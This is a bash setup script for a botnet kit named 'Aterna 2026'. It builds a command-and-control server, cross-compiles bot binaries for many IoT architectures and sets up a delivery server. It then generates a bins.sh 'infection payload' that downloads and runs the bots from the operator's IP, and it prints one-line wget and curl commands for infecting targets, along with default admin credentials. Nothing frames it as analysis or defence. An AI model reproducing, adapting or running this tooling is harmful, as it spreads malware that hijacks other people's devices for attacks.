#!/bin/bash

# Aterna 2026 Auto-Setup Script
# Modern, Fast, and Robust.

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

echo -e "${CYAN}--------------------------------------------------${NC}"
echo -e "${CYAN}          ATERNA 2026 - AUTO SETUP                ${NC}"
echo -e "${CYAN}--------------------------------------------------${NC}"

# Check if running as root
if [ "$EUID" -ne 0 ]; then 
  echo -e "${RED}Please run as root (sudo)${NC}"
  exit 1
fi

# 1. Update and Install Dependencies
echo -e "${GREEN}[+] Updating system and installing dependencies...${NC}"
apt-get update -y
apt-get install -y make gcc git wget curl sqlite3 golang screen

# 2. Setup Go Environment (ensure it's modern)
echo -e "${GREEN}[+] Configuring Go environment...${NC}"
GO_VERSION=$(go version | awk '{print $3}' | sed 's/go//')
echo -e "    Detected Go version: ${GO_VERSION}"

# 3. Setup CNC
echo -e "${GREEN}[+] Building CNC Server...${NC}"
if [ -d "cnc" ]; then
    cd cnc
    go mod tidy
    go build -o c2 main.go
    if [ $? -eq 0 ]; then
        echo -e "    ${GREEN}✓ CNC built successfully.${NC}"
    else
        echo -e "    ${RED}✗ CNC build failed.${NC}"
        exit 1
    fi
    cd ..
else
    echo -e "    ${RED}✗ CNC directory not found.${NC}"
fi

# 4. Setup Bot Cross-Compilers
echo -e "${GREEN}[+] Setting up bot cross-compilers...${NC}"
make setup-crosscompilers
if [ $? -eq 0 ]; then
    echo -e "    ${GREEN}✓ Cross-compilers installed.${NC}"
else
    echo -e "    ${RED}✗ Cross-compiler setup failed.${NC}"
fi

# 5. Build Bot Binaries
echo -e "${GREEN}[+] Building Bot Binaries...${NC}"
make build
if [ $? -eq 0 ]; then
    echo -e "    ${GREEN}✓ Bots compiled successfully.${NC}"
else
    echo -e "    ${RED}✗ Bot compilation failed.${NC}"
fi

# 6. Setup Delivery Server
echo -e "${GREEN}[+] Building Delivery Server...${NC}"
if [ -d "server" ]; then
    cd server
    go mod tidy
    go build -o server main.go
    if [ $? -eq 0 ]; then
        echo -e "    ${GREEN}✓ Delivery server built successfully.${NC}"
    else
        echo -e "    ${RED}✗ Delivery server build failed.${NC}"
    fi
    cd ..
fi

# 7. Generate Infection Payloads
echo -e "${GREEN}[+] Generating Infection Payloads...${NC}"
# Get Public IP
IP=$(curl -s https://api.ipify.org || wget -qO- https://api.ipify.org || echo "YOUR_IP")

# Ensure static directory exists
mkdir -p server/static

# Create bins.sh payload (stripping \r for Linux compatibility)
cat <<EOF | tr -d '\r' > server/static/bins.sh
#!/bin/sh
# Aterna 2026 Infection Payload
BINS="arm arm5 arm6 arm7 x86 x86_32 m68k mips mpsl ppc ppc440 sh4 sparc x86_64"
for bin in \$BINS; do
    wget http://$IP/release/\$bin -O /tmp/\$bin || curl -O /tmp/\$bin http://$IP/release/\$bin
    chmod +x /tmp/\$bin
    /tmp/\$bin aterna
done
rm -f /tmp/bins.sh
EOF

# 8. Final Instructions
echo -e "${CYAN}--------------------------------------------------${NC}"
echo -e "${GREEN}SETUP COMPLETE!${NC}"
echo -e "${CYAN}--------------------------------------------------${NC}"
echo -e "To start the CNC:"
echo -e "  cd cnc && screen -S cnc ./c2"
echo -e ""
echo -e "To start the Delivery Server (Port 80):"
echo -e "  cd server && screen -S server ./server"
echo -e ""
echo -e "Admin Credentials (Default):"
echo -e "  Username: admin"
echo -e "  Password: chocolate_nya"
echo -e ""
echo -e "${CYAN}--- INFECTION PAYLOADS ---${NC}"
echo -e "Wget Payload:"
echo -e "  ${GREEN}cd /tmp; wget http://$IP/bins.sh; chmod +x bins.sh; ./bins.sh; rm -rf bins.sh${NC}"
echo -e ""
echo -e "Curl Payload:"
echo -e "  ${GREEN}cd /tmp; curl -O http://$IP/bins.sh; chmod +x bins.sh; ./bins.sh; rm -rf bins.sh${NC}"
echo -e ""
echo -e "Universal One-Liner:"
echo -e "  ${GREEN}cd /tmp; (wget http://$IP/bins.sh -O bins.sh || curl -O bins.sh http://$IP/bins.sh); chmod +x bins.sh; ./bins.sh; rm -rf bins.sh${NC}"
echo -e "${CYAN}--------------------------------------------------${NC}"
